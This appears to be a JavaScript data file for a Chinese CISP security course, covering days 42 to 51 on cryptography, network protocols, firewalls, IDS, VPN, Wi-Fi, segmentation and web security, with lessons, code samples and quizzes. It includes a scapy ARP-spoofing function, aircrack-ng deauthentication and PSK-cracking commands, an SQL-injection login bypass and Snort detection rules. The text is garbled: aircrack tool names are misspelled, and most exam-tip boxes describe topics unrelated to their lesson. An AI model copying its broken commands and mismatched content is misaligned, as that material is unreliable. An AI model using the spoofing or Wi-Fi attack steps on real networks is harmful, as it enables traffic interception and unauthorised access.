  codeExample:{language:'python',code:`# 第六周综合练习\nfrom Crypto.Cipher import AES\nfrom Crypto.PublicKey import RSA\nimport hashlib\n\n# 1. AES加密\nkey = b"0123456789abcdef"  # 16字节=128位\ncipher = AES.new(key, AES.MODE_EAX)\nct, tag = cipher.encrypt_and_digest(b"Secret Data")\nprint(f"AES加密成功, 密文长度: {len(ct)}")\n\n# 2. 哈希\nh = hashlib.sha256(b"CISP Exam").hexdigest()\nprint(f"SHA-256: {h[:16]}...")\n\n# 3. RSA\nk = RSA.generate(2048)\nprint(f"RSA-2048密钥生成成功")`,description:'加密技术综合练习代码'},
  quiz:[{id:'q42-1',question:'AES-256的密钥长度是多少？',options:['128位','256位','512位','64位'],correctIndex:1,explanation:'AES-256密钥256位。'},{id:'q42-2',question:'ECC相比RSA的主要优势？',options:['更安全','密钥更短','更快','更简单'],correctIndex:1,explanation:'ECC密钥更短且安全性相当。'},{id:'q42-3',question:'SHA-256输出多少位？',options:['128位','256位','512位','64位'],correctIndex:1,explanation:'SHA-256输出256位。'},{id:'q42-4',question:'数字签名保证什么？',options:['机密性','完整性和非否认性','可用性','速度'],correctIndex:1,explanation:'签名确保完整性和不可否认。'},{id:'q42-5',question:'TLS 1.3移除了哪个密钥交换方式？',options:['ECDHE','DHE','RSA密钥交换','PSK'],correctIndex:2,explanation:'TLS 1.3移除不安全RSA密钥交换。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[42]||[],
});

// ============================================================
// Week 7: 网络安全 (Day 43-49)
// ============================================================
allDays.push({id:'day-43',day:43,week:7,title:'网络协议安全（网络安全）',
  objectives:['理解OSI七层模型安全','掌握TCP/IP协议栈攻击','了解ARP/DNS欺骗','学习网络协议加固'],
  content:`# 网络协议安全\n\n## 概述\n\n网络协议是互联网通信的基础，但许多协议在设计时未充分考虑安全因素。理解各层协议的安全问题对网络安全防护至关重要。\n\n## 核心内容\n\n### 一、OSI七层安全\n\n- 物理层：线缆窃听、电磁泄漏\n- 数据链路层：MAC泛滥、ARP欺骗、VLAN跳跃\n- 网络层：IP欺骗、ICMP攻击、路由投毒\n- 传输层：TCP SYN Flood、UDP Flood、端口扫描\n- 会话层：会话劫持、中间人攻击\n- 表示层：SSL剥离、编码攻击\n- 应用层：DNS欺骗、HTTP劫持、SQL注入\n\n### 二、ARP欺骗\n\n攻击者发送虚假ARP响应，将自身MAC地址绑定到网关IP：\n- 工具：arpspoof、Ettercap\n- 后果：中间人攻击、流量劫持\n- 防御：静态ARP表、DAI（动态ARP检测）\n\n### 三、DNS安全\n\n**常见攻击：**\n- DNS缓存投毒：污染DNS服务器缓存\n- DNS劫持：篡改DNS解析结果\n- DNS放大攻击：利用开放递归DNS放大流量\n\n**防御措施：**\n- DNSSEC数字签名DNS记录\n- DoH/DoT加密DNS查询\n- 限制递归查询\n\n### 四、TCP/IP攻击\n\n- SYN Flood：大量SYN包耗尽服务器半连接队列\n- TCP会话劫持：预测序列号劫持会话\n- IP分片攻击：利用分片重叠绕过防火墙\n\n### 五、协议安全加固\n\n- 使用SSH替代Telnet\n- 使用HTTPS替代HTTP\n- 使用SFTP替代FTP\n- 禁用不必要的协议和服务\n\n## \n## 🔴 高频考点\n\n· WPA3三大改进：**SAE握手防离线字典、前向保密、Wi-Fi Easy Connect(IoT配网)**\n· Evil Twin攻击：伪造同名WiFi热点→用户连上→攻击者窃听所有流量\n· 802.1X+EAP是**企业WiFi**的标准认证方案(配RADIUS服务器)\n## 💜 记忆口诀\n\n· **无线加密演进**："WEP裂了→WPA过渡→WPA2十年标准→WPA3新王者"\n· **Evil Twin**："不要只看WiFi名——验证BSSID和证书"\n学习建议\n- 理解各层协议的攻击面\n- 用Wireshark分析常见攻击流量\n- 掌握网络协议的安全配置`,
  codeExample:{language:'python',code:`from scapy.all import *\n# ARP欺骗演示脚本（仅用于学习）\ndef arp_spoof(target_ip, spoof_ip):\n    target_mac = getmacbyip(target_ip)\n    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n    send(packet, verbose=False)\n    print(f"发送ARP欺骗: {target_ip} 认为 {spoof_ip} 的MAC是你")\n\ndef get_mac_by_ip(ip):\n    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)\n    return ans[0][1].hwsrc if ans else None\n\nprint("ARP协议安全学习工具")\nprint("请仅在授权环境使用")`,description:'ARP协议安全分析'},
  quiz:[{id:'q43-1',question:'ARP欺骗发生在OSI哪一层？',options:['物理层','数据链路层','网络层','传输层'],correctIndex:1,explanation:'ARP工作在第二层。'},{id:'q43-2',question:'防御ARP欺骗的技术不包括？',options:['静态ARP','DAI','DNSSEC','端口安全'],correctIndex:2,explanation:'DNSSEC用于DNS安全。'},{id:'q43-3',question:'SYN Flood攻击目标是什么？',options:['窃取数据','耗尽半连接队列','破解密码','注入代码'],correctIndex:1,explanation:'SYN Flood消耗连接资源。'},{id:'q43-4',question:'DNSSEC提供什么？',options:['加密DNS','DNS完整性验证','DNS缓存加速','DNS负载均衡'],correctIndex:1,explanation:'通过数字签名确保DNS记录完整性。'},{id:'q43-5',question:'替代Telnet的安全协议？',options:['HTTP','FTP','SSH','SMTP'],correctIndex:2,explanation:'SSH加密替代明文Telnet。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[43]||[],
});
allDays.push({id:'day-44',day:44,week:7,title:'防火墙技术（网络安全）',
  objectives:['理解防火墙原理和类型','掌握iptables/nftables配置','了解下一代防火墙','学习DMZ设计'],
  content:`# 防火墙技术\n\n## 概述\n\n防火墙是网络安全的第一道防线，通过预设规则控制进出网络的流量。从包过滤到下一代防火墙（NGFW），防火墙技术不断演进以应对日益复杂的威胁。\n\n## 核心内容\n\n### 一、防火墙类型\n\n**包过滤防火墙：**\n- 基于IP/端口/协议过滤\n- 工作在第三层（网络层）\n- 简单高效但缺乏深度检查\n\n**状态检测防火墙：**\n- 记录连接状态（NEW/ESTABLISHED/RELATED）\n- 自动允许已建立连接的返回流量\n- iptables/netfilter是代表实现\n\n**应用层防火墙（WAF）：**\n- 解析HTTP/HTTPS流量\n- 检测SQL注入/XSS等应用层攻击\n- ModSecurity是开源WAF\n\n**下一代防火墙（NGFW）：**\n- 集成IPS/IDS\n- 应用识别和用户身份感知\n- SSL深度检测\n- 威胁情报联动\n\n### 二、Iptables基础\n\n三表五链：\n- filter表：INPUT/OUTPUT/FORWARD\n- nat表：PREROUTING/POSTROUTING/OUTPUT\n- mangle表：修改包标记\n\n### 三、DMZ设计\n\n非军事化区隔离内网和外网：\n外部→防火墙→DMZ（Web/Mail服务器）→防火墙→内网\n\n### 四、防火墙策略\n\n- 默认拒绝（默认DROP，仅允许白名单）\n- 最小权限原则\n- 定期审计规则和日志\n- 防范规则绕过和IP欺骗\n\n## 学习建议\n- 在实验环境配置iptables规则\n- 理解状态检测防火墙的连接追踪\n- 了解DMZ网络设计原则`,
  codeExample:{language:'bash',code:`# iptables基础规则\n# 设置默认策略\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n# 允许本地回环\niptables -A INPUT -i lo -j ACCEPT\n\n# 允许已建立的连接\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# 开放SSH(22)和HTTP(80)\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\n\n# 防止SYN Flood\niptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\niptables -L -n -v`,description:'iptables防火墙规则示例'},
  quiz:[{id:'q44-1',question:'状态检测防火墙跟踪什么？',options:['IP地址','连接状态','端口号','协议类型'],correctIndex:1,explanation:'跟踪连接状态ESTABLISHED/NEW。'},{id:'q44-2',question:'WAF主要检测哪类攻击？',options:['网络层','传输层','应用层','物理层'],correctIndex:2,explanation:'WAF=Web应用防火墙。'},{id:'q44-3',question:'DMZ的作用？',options:['加速网络','隔离内外网','管理用户','存储备份'],correctIndex:1,explanation:'DMZ作为缓冲区隔离内外网。'},{id:'q44-4',question:'防火墙默认策略应设为？',options:['ACCEPT','REJECT','DROP','FORWARD'],correctIndex:2,explanation:'默认DROP更安全，再白名单允许。'},{id:'q44-5',question:'NGFW的"NG"代表？',options:['New Generation','Next Generation','New Gateway','Network Gateway'],correctIndex:1,explanation:'Next Generation Firewall。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[44]||[],
});
allDays.push({id:'day-45',day:45,week:7,title:'入侵检测系统（网络安全）',
  objectives:['理解IDS/IPS原理','区分基于签名和基于异常的检测','了解Snort/Suricata','学习告警分析'],
  content:`# 入侵检测系统\n\n## 概述\n\nIDS（入侵检测系统）监控网络或主机活动，检测恶意行为或违规操作并产生告警。IPS（入侵防御系统）在检测的基础上还可以主动阻断攻击。\n\n## 核心内容\n\n### 一、IDS vs IPS\n\n| 特性 | IDS | IPS |\n|------|-----|-----|\n| 位置 | 旁路部署（TAP/SPAN） | 串联部署（Inline） |\n| 动作 | 仅告警 | 告警+阻断 |\n| 延迟 | 无 | 有 |\n| 风险 | 低 | 可能误阻断 |\n\n### 二、基于签名的检测\n\n维护已知攻击的特征库（规则集），匹配即告警：\n- 优势：低误报率\n- 劣势：无法检测未知攻击（0day）\n- 代表：Snort签名规则\n\n### 三、基于异常的检测\n\n建立正常行为基线，偏离基线则告警：\n- 优势：可检测未知攻击\n- 劣势：较高误报率\n- 结合机器学习的UEBA\n\n### 四、Snort规则\n\nSnort规则格式：\n\`alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"SQLi"; content:"UNION SELECT"; sid:1001;)\`\n\n### 五、部署位置\n\n- 网络边界（NIDS）\n- 关键网段（内部监控）\n- 主机层面（HIDS）\n\n### 六、告警分析\n\n- 误报（False Positive）：正常行为被判定为攻击\n- 漏报（False Negative）：攻击未被检测\n- 告警分级和关联分析\n- SIEM运营\n\n## \n## 🔴 高频考点\n\n· SQL注入分类：联合查询注入→报错注入→布尔盲注→时间盲注——四种注入的数据回显方式不同\n· 万能密码经典原理：admin OR 1=1 ——利用SQL条件永真绕过登录\n· 防御SQLi根本方案：**参数化查询(PreparedStatement)**，辅助：白名单+最小权限+WAF\n## 💜 记忆口诀\n\n· **四种注入**："联合(UNION)→报错(利用回显)→布尔(true/false盲注)→时间(看延迟)"\n· **防御**："参数化(根本)+白名单+WAF+最小权限"\n学习建议\n- 部署Snort/Suricata进行实验\n- 理解规则编写语法\n- 学习告警研判和误报处理`,
  codeExample:{language:'bash',code:`# Snort基本命令\nsnort -i eth0 -c /etc/snort/snort.conf -A console\n\n# Snort规则示例\ncat > /etc/snort/rules/local.rules << 'EOF'\n# ICMP探测检测\nalert icmp any any -> any any (msg:"ICMP探测"; itype:8; sid:1000001;)\n\n# SQL注入检测\nalert tcp any any -> any 80 (msg:"SQL注入"; flow:to_server,established; content:"UNION"; nocase; sid:1000002;)\n\n# 端口扫描检测\nalert tcp any any -> any any (msg:"端口扫描"; flags:S; threshold:type threshold,track by_src,count 20,seconds 3; sid:1000003;)\nEOF`,description:'Snort IDS规则配置示例'},
  quiz:[{id:'q45-1',question:'IDS和IPS的关键区别？',options:['IDS有延迟','IPS可主动阻断','IDS误报更少','IPS更便宜'],correctIndex:1,explanation:'IPS串联部署可阻断攻击。'},{id:'q45-2',question:'基于签名检测的劣势？',options:['误报多','无法检测0day','速度慢','成本高'],correctIndex:1,explanation:'签名检测需要已知攻击特征。'},{id:'q45-3',question:'Snort规则中的sid代表？',options:['源IP','签名ID','会话ID','安全级别'],correctIndex:1,explanation:'sid=Signature ID。'},{id:'q45-4',question:'NIDS和HIDS的区别？',options:['速度不同','NIDS监控网络，HIDS监控主机','价格不同','开发语言不同'],correctIndex:1,explanation:'N=Network,H=Host。'},{id:'q45-5',question:'正常行为被判定为攻击叫什么？',options:['漏报','误报','真报','报警'],correctIndex:1,explanation:'False Positive=误报。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[45]||[],
});
allDays.push({id:'day-46',day:46,week:7,title:'VPN技术（网络安全）',
  objectives:['理解VPN原理和类型','掌握IPsec/SSL VPN','了解WireGuard','学习VPN安全配置'],
  content:`# VPN技术\n\n## 概述\n\nVPN（虚拟专用网）通过加密隧道在不安全的公共网络上建立安全的专用连接。VPN广泛应用于远程办公、分支机构互联和数据加密传输场景。\n\n## 核心内容\n\n### 一、VPN类型\n\n**IPsec VPN（站点到站点）：**\n- 工作在第三层（网络层）\n- AH（认证头）+ ESP（封装安全载荷）\n- IKE协议管理密钥\n- 适合固定站点互联\n\n**SSL VPN（远程访问）：**\n- 基于TLS/SSL\n- 浏览器即可接入，无需客户端\n- 适合远程办公\n\n**WireGuard VPN：**\n- 现代VPN协议，代码简洁\n- 内核态运行，性能优异\n- 仅4000行代码\n- 使用ChaCha20+Poly1305加密\n\n### 二、IPsec安全协议\n\n**ESP提供：**机密性（加密）+ 完整性（HMAC）+ 反重放\n\n**两种模式：**\n- 传输模式：仅加密IP负载\n- 隧道模式：加密整个IP包（更常用）\n\n### 三、IKE密钥交换\n\nIKEv2两步建立IPsec SA：\n1. IKE_SA_INIT：建立安全信道\n2. IKE_AUTH：身份认证、建立CHILD_SA\n\n### 四、VPN安全性配置\n\n- 使用强加密算法（AES-256）\n- 配置完美前向安全（PFS）\n- 定期更换密钥\n- 限制同时登录数\n- MFA二次认证\n\n## \n## 🔴 高频考点\n\n· XSS三类必须记住：反射型(一次性/URL)、存储型(持久/危害最大)、DOM型(纯客户端)\n· **CSP内容安全策略**是现代XSS终极防线——HTTP头声明允许加载的资源来源白名单\n· HttpOnly Cookie(JS不可读)+CSP+输出编码=三重XSS防线\n## 💜 记忆口诀\n\n· **XSS三类**："反射一次性、存储持久性(危害最大)、DOM纯前端"\n· **三重防线**："CSP+HttpOnly+输出编码"\n学习建议\n- 部署OpenVPN或WireGuard实验\n- 理解IPsec隧道模式和传输模式区别\n- 了解零信任网络架构替代传统VPN的趋势`,
  codeExample:{language:'python',code:`import subprocess, json\n# WireGuard配置生成\nwg_config = {\n    "interface": {\n        "PrivateKey": "<private_key>",\n        "Address": "10.0.0.1/24",\n        "ListenPort": 51820\n    },\n    "peers": [{\n        "PublicKey": "<peer_public_key>",\n        "AllowedIPs": "10.0.0.2/32",\n        "Endpoint": "peer.example.com:51820",\n        "PersistentKeepalive": 25\n    }]\n}\nprint("WireGuard配置示例:")\nprint(json.dumps(wg_config, indent=2))\nprint("\\n启动WireGuard: wg-quick up wg0")\nprint("关闭WireGuard: wg-quick down wg0")`,description:'WireGuard VPN配置示例'},
  quiz:[{id:'q46-1',question:'IPsec ESP提供什么服务？',options:['仅加密','加密+认证+反重放','仅认证','仅隧道'],correctIndex:1,explanation:'ESP=封装安全载荷。'},{id:'q46-2',question:'WireGuard使用的加密算法？',options:['AES-GCM','ChaCha20+Poly1305','RSA-OAEP','3DES-CBC'],correctIndex:1,explanation:'WireGuard使用现代密码算法。'},{id:'q46-3',question:'IPsec隧道模式加密什么？',options:['仅负载','整个IP包','仅头部','仅尾部'],correctIndex:1,explanation:'隧道模式封装整个IP包。'},{id:'q46-4',question:'IKE的全称？',options:['Internet Key Exchange','Internal Kernel Engine','Integrated Key Encryption','Internet Knowledge Exchange'],correctIndex:0,explanation:'密钥交换协议。'},{id:'q46-5',question:'SSL VPN相比IPsec VPN的优势？',options:['更快','浏览器即可使用','更安全','支持更低层'],correctIndex:1,explanation:'SSL VPN无需客户端。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[46]||[],
});
allDays.push({id:'day-47',day:47,week:7,title:'无线网络安全（网络安全）',
  objectives:['理解WiFi安全协议演进','掌握WPA3新特性','了解无线攻击方法','学习企业级WiFi安全'],
  content:`# 无线网络安全\n\n## 概述\n\n无线网络因其开放性面临独特的安全挑战。从WEP到WPA3，WiFi安全协议不断演进以应对破解技术的进步。\n\n## 核心内容\n\n### 一、WiFi安全协议演进\n\n- **WEP**：RC4算法，24位IV，2001年已被破解，仅几分钟即可破解\n- **WPA**：TKIP临时密钥完整性协议，64位MIC\n- **WPA2**：AES-CCMP，WPA2-Personal（PSK）/ WPA2-Enterprise（802.1X）\n- **WPA3**：SAE代替PSK、192位加密、前向安全\n\n### 二、WPA2安全\n\n**WPA2-PSK四步握手：**\n1. AP发送ANonce\n2. 客户端发送SNonce+MIC\n3. AP发送GTK+MIC\n4. 客户端确认\n\n**KRACK攻击**：利用握手重传漏洞重新安装密钥\n\n### 三、WPA3改进\n\n- **SAE**（对等实体同时认证）：替代PSK防离线字典攻击\n- **192位安全套件**：企业级增强安全\n- **OWE**（增强开放）：加密开放式WiFi\n- **DPP**（设备配置协议）：替代WPS\n\n### 四、无线攻击方法\n\n- 暴力破解/字典攻击PSK\n- 伪造AP（Evil Twin攻击）\n- 取消认证攻击（Deauth）\n- WPS PIN暴力破解\n- 中间人攻击和会话劫持\n\n### 五、企业WiFi安全\n\n- 802.1X + RADIUS认证\n- EAP-TLS证书认证\n- 网络准入控制（NAC）\n- Guest网络隔离\n- 无线IDS监控\n\n## \n## 🔴 高频考点\n\n· CSRF利用**浏览器自动携带Cookie**机制——用户已登录A站→访问恶意B站→B偷偷向A发请求\n· 防御三板斧：①**Anti-CSRF Token**(表单隐藏字段)②SameSite Cookie ③Referer/Origin检查\n· CSRF vs XSS：XSS注入代码到页面、CSRF借用凭证发请求——两者可组合但本质不同\n## 💜 记忆口诀\n\n· **场景**："已登录银行(有Cookie)→点恶意链接→偷偷转了钱"\n· **三板斧**："Token(随机验证)+SameSite(不跨站)+Referer检查"\n学习建议\n- 使用aircrack-ng在实验环境练习WiFi安全测试\n- 升级到WPA3\n- 禁用WPS功能`,
  codeExample:{language:'bash',code:`# Aircrack-ng WiFi安全测试\n# 开启监听模式\nairmon-ng start wlan0\n\n# 扫描附近WiFi\naio-ng wlan0mon\n\n# 抓取目标AP的四步握手包\nauto-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# 取消认证攻击（抓握手包）\nairplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\n\n# 字典破解PSK\naircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap\n\necho "仅在授权环境使用"`,description:'WiFi安全测试命令'},
  quiz:[{id:'q47-1',question:'WPA3取代PSK的机制叫什么？',options:['EAP','SAE','WEP','TKIP'],correctIndex:1,explanation:'SAE防离线字典攻击。'},{id:'q47-2',question:'KRACK攻击利用了什么？',options:['加密算法漏洞','四步握手重传','密码太短','信号干扰'],correctIndex:1,explanation:'利用握手消息重传降级密钥。'},{id:'q47-3',question:'WPA2-Enterprise使用什么认证？',options:['PSK','802.1X','WPS','MAC过滤'],correctIndex:1,explanation:'企业级用RADIUS+802.1X。'},{id:'q47-4',question:'WPA3支持的加密位数？',options:['128位','192位','256位','512位'],correctIndex:1,explanation:'WPA3企业级支持192位加密。'},{id:'q47-5',question:'Evil Twin攻击属于？',options:['暴力破解','社会工程','伪造AP','协议漏洞'],correctIndex:2,explanation:'伪造同名AP欺骗用户连接。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[47]||[],
});
allDays.push({id:'day-48',day:48,week:7,title:'网络分段（网络安全）',
  objectives:['理解网络分段原理','掌握VLAN技术','了解微分段','学习零信任网络设计'],
  content:`# 网络分段\n\n## 概述\n\n网络分段是将网络划分为多个独立区域的安全策略。通过分段限制攻击者的横向移动空间，即使单个网段被攻破，也无法蔓延到整个网络。\n\n## 核心内容\n\n### 一、分段策略\n\n**物理分段：**\n- 使用不同交换机/路由器隔离\n- 安全性高但成本高\n\n**逻辑分段（VLAN）：**\n- 虚拟局域网，同一物理设备不同逻辑广播域\n- IEEE 802.1Q标记\n- 结合ACL控制VLAN间流量\n\n**微分段（Micro-Segmentation）：**\n- 零信任理念的实现\n- 东西向流量控制（主机到主机）\n- NSX等SDN技术实现\n\n### 二、VLAN技术\n\n**VLAN类型：**\n- 端口VLAN：交换机端口划分\n- MAC VLAN：按MAC地址划分\n- 协议VLAN：按三层协议划分\n\n**VLAN安全：**\n- 不要使用VLAN 1（默认VLAN）\n- 配置Native VLAN\n- 防止VLAN跳跃攻击\n- 禁用DTP动态中继\n\n### 三、微分段和零信任\n\n零信任网络访问（ZTNA）原则：\n1. 永不信任，始终验证\n2. 最小权限原则\n3. 假设已被入侵\n4. 持续监控和验证\n\n### 四、网络边界防护\n\n- 部署NAC网络准入控制\n- 端口安全（Port Security）\n- DHCP Snooping防止伪造DHCP\n- IP Source Guard防止IP欺骗\n- DAI动态ARP检测\n\n## \n## 🔴 高频考点\n\n· 文件上传防御五层：**类型白名单(核心)→内容检测Magic Number→随机文件名→禁执行→杀毒**\n· 白名单>黑名单——永远不要用黑名单(攻击者有无数绕过方法)\n· PHP一句话木马：图片里藏代码→上传→解析漏洞→代码被执行\n## 💜 记忆口诀\n\n· **防御五层**: 类型白→内容检→随机名→禁执行→杀毒扫\n· **白名单优先**: 只允许.jpg/.png/.gif——黑名单永远不够\n学习建议\n- 在实验环境配置VLAN和Trunk\n- 理解微分段在企业安全中的价值\n- 了解SDP/ZTNA架构`,
  codeExample:{language:'bash',code:`# Cisco VLAN配置示例\nenable\nconfigure terminal\n\n# 创建VLAN\nvlan 10\n name DMZ\nvlan 20\n name Internal\nvlan 30\n name Guest\n\n# 将端口分配到VLAN\ninterface GigabitEthernet0/1\n switchport mode access\n switchport access vlan 10\n\n# Trunk端口\ninterface GigabitEthernet0/24\n switchport mode trunk\n switchport trunk allowed vlan 10,20,30\n\n# 端口安全\ninterface GigabitEthernet0/1\n switchport port-security\n switchport port-security maximum 2\n switchport port-security violation restrict`,description:'VLAN和端口安全配置'},
  quiz:[{id:'q48-1',question:'VLAN跳跃攻击针对什么？',options:['密码','VLAN间隔离','带宽','DNS'],correctIndex:1,explanation:'绕过VLAN隔离访问其他VLAN。'},{id:'q48-2',question:'微分段控制什么方向流量？',options:['南北向','东西向','上下向','任何方向'],correctIndex:1,explanation:'东西向=主机到主机流量。'},{id:'q48-3',question:'零信任的核心原则？',options:['信任内网','永不信任始终验证','信任用户','信任设备'],correctIndex:1,explanation:'零信任否定内网=安全的假设。'},{id:'q48-4',question:'应该避免使用哪个VLAN ID？',options:['10','100','1','1000'],correctIndex:2,explanation:'VLAN 1是默认VLAN易被攻击。'},{id:'q48-5',question:'DAI防御什么攻击？',options:['DDoS','ARP欺骗','SQL注入','钓鱼'],correctIndex:1,explanation:'Dynamic ARP Inspection。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[48]||[],
});
allDays.push({id:'day-49',day:49,week:7,title:'第七周总结与测验（网络安全）',
  objectives:['回顾网络协议安全','总结防火墙和IDS技术','掌握VPN和无线安全','综合测验'],
  content:`# 第七周总结与测验\n\n## 本周知识回顾\n\n### Day 43 - 网络协议安全\n- OSI七层攻击面\n- ARP欺骗/DNS安全\n- TCP/IP协议攻击\n\n### Day 44 - 防火墙技术\n- 包过滤/状态检测/WAF/NGFW\n- iptables规则\n- DMZ设计\n\n### Day 45 - 入侵检测系统\n- IDS vs IPS\n- 签名检测和异常检测\n- Snort规则编写\n\n### Day 46 - VPN技术\n- IPsec/SSL VPN/WireGuard\n- IKE密钥交换\n- 隧道模式和传输模式\n\n### Day 47 - 无线网络安全\n- WEP→WPA→WPA2→WPA3\n- SAE/KRACK攻击\n- 802.1X企业WiFi\n\n### Day 48 - 网络分段\n- VLAN/Trunk/微分段\n- 零信任ZTNA\n- NAC和端口安全\n\n## 综合测验`,
  codeExample:{language:'python',code:`# 第七周综合复习\nprint("=== 网络安全知识点复习 ===\\n")\n\nprotocols = {\n    "ARP欺骗": ("数据链路层","DAI/静态ARP"),\n    "SYN Flood": ("传输层","SYN Cookie/限流"),\n    "DNS投毒": ("应用层","DNSSEC"),\n}\nfor attack, (layer, defense) in protocols.items():\n    print(f"{attack}: 发生在{layer}, 防御: {defense}")\n\nvpn_types = ["IPsec VPN", "SSL VPN", "WireGuard"]\nprint(f"\\nVPN类型: {', '.join(vpn_types)}")\n\nwifi_evolution = ["WEP(不安全)", "WPA", "WPA2", "WPA3(最新)"]\nprint(f"WiFi安全演进: {' → '.join(wifi_evolution)}")`,description:'网络安全知识体系回顾'},
  quiz:[{id:'q49-1',question:'防火墙中DMZ的作用？',options:['存储日志','隔离内外网','管理用户','备份数据'],correctIndex:1,explanation:'DMZ缓冲隔离内外网。'},{id:'q49-2',question:'WPA3中SAE取代了什么？',options:['AES','PSK','RADIUS','802.1X'],correctIndex:1,explanation:'SAE防离线破解PSK。'},{id:'q49-3',question:'零信任的核心口号？',options:['信任但验证','永不信任始终验证','先信任后验证','验证后信任'],correctIndex:1,explanation:'零信任否定默认信任。'},{id:'q49-4',question:'IPS相比IDS能做什么？',options:['记录日志','主动阻断','生成报告','分析流量'],correctIndex:1,explanation:'IPS可主动阻断攻击流量。'},{id:'q49-5',question:'WireGuard相比IPsec的优势？',options:['更安全','代码更简洁性能更好','支持更多协议','免费'],correctIndex:1,explanation:'WireGuard仅4000行代码。'}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[49]||[],
});

// ============================================================
// Week 8: 应用安全 (Day 50-56)
// ============================================================
allDays.push({id:'day-50',day:50,week:8,title:'Web安全基础（应用安全）',
  objectives:['理解OWASP Top 10','掌握Web安全核心概念','了解同源策略','学习HTTP安全头'],
  content:`# Web安全基础\n\n## 概述\n\nWeb应用安全是当今最受关注的网络安全领域之一。OWASP（开放Web应用安全项目）定期发布Top 10风险列表，为Web安全提供权威指导。\n\n## 核心内容\n\n### 一、OWASP Top 10（2021版）\n\n1. Broken Access Control 访问控制失效\n2. Cryptographic Failures 加密失败\n3. Injection 注入攻击\n4. Insecure Design 不安全设计\n5. Security Misconfiguration 安全配置错误\n6. Vulnerable Components 脆弱组件\n7. Auth Failures 认证失败\n8. Software & Data Integrity 软件和数据完整性\n9. Logging & Monitoring 日志监控不足\n10. SSRF 服务端请求伪造\n\n### 二、同源策略\n\n浏览器安全基石：协议+域名+端口三者完全相同才算同源。\n\n**跨域解决方案：**\n- CORS跨域资源共享\n- JSONP（已不推荐）\n- 反向代理\n\n### 三、HTTP安全头\n\n- Content-Security-Policy: CSP策略\n- Strict-Transport-Security: 强制HTTPS\n- X-Frame-Options: 防点击劫持\n- X-Content-Type-Options: nosniff\n- Referrer-Policy: 控制Referer\n- Permissions-Policy: 控制特性权限\n\n### 四、Web安全测试\n\n- 自动化扫描：AWVS/Nessus\n- 手工测试：Burp Suite/浏览器DevTools\n- 代码审计：Semgrep/SonarQube\n\n## \n## 🔴 高频考点\n\n· OWASP安全编码七大原则：输入验证→输出编码→参数化查询→认证会话→加密→错误处理→日志\n· C函数安全替换：strcpy→strncpy、gets→fgets、sprintf→snprintf——n版本有长度限制防溢出\n· SAST(白盒/静态扫描)集成到CI——每次commit自动扫描是最佳实践\n## 💜 记忆口诀\n\n· **安全编码三句**："进(输入)验证、出(输出)编码、中(数据库)参数化"\n· **C函数替换**："有n选n——strcpy→strncpy、gets→fgets"\n学习建议\n- 熟记OWASP Top 10\n- 在日常开发中应用安全头\n- 养成白盒+黑盒测试的安全习惯`,
  codeExample:{language:'python',code:`from flask import Flask, request, jsonify\napp = Flask(__name__)\n\n@app.after_request\ndef add_security_headers(response):\n    response.headers['X-Content-Type-Options'] = 'nosniff'\n    response.headers['X-Frame-Options'] = 'DENY'\n    response.headers['X-XSS-Protection'] = '1; mode=block'\n    response.headers['Strict-Transport-Security'] = 'max-age=31536000'\n    response.headers['Content-Security-Policy'] = "default-src 'self'"\n    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'\n    return response\n\n@app.route('/api/data')\ndef data():\n    origin = request.headers.get('Origin')\n    # 实现CORS\n    if origin in ['https://trusted.com']:\n        resp = jsonify({\"msg\": \"ok\"})\n        resp.headers['Access-Control-Allow-Origin'] = origin\n        return resp\n    return jsonify({\"error\": \"not allowed\"}), 403`,description:'Flask安全响应头配置'},
  quiz:[{id:'q50-1',question:'OWASP Top 10(2021)中排名第一的是？',options:['注入','访问控制失效','XSS','加密失败'],correctIndex:1,explanation:'Broken Access Control升到第一。'},{id:'q50-2',question:'X-Frame-Options:DENY的作用？',options:['禁止缓存','禁止iframe嵌入','禁止JS','禁止Cookie'],correctIndex:1,explanation:'防御点击劫持。'},{id:'q50-3',question:'同源策略不检查什么？',options:['协议','域名','端口','路径'],correctIndex:3,explanation:'路径不同不算跨域。'},{id:'q50-4',question:'HSTS的作用？',options:['加速网站','强制HTTPS','压缩数据','缓存内容'],correctIndex:1,explanation:'HTTP Strict Transport Security。'},{id:'q50-5',question:'CORS的全称？',options:['Cross-Origin Resource Sharing','Cross-Origin Request Security','Cross-Origin Response Standard','Common-Origin Resource Service'],correctIndex:0,explanation:'跨域资源共享。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[50]||[],
});

allDays.push({id:'day-51',day:51,week:8,title:'SQL注入深入（应用安全）',
  objectives:['复习SQL注入原理','掌握高级注入技巧','了解防御绕过','学习ORM安全'],
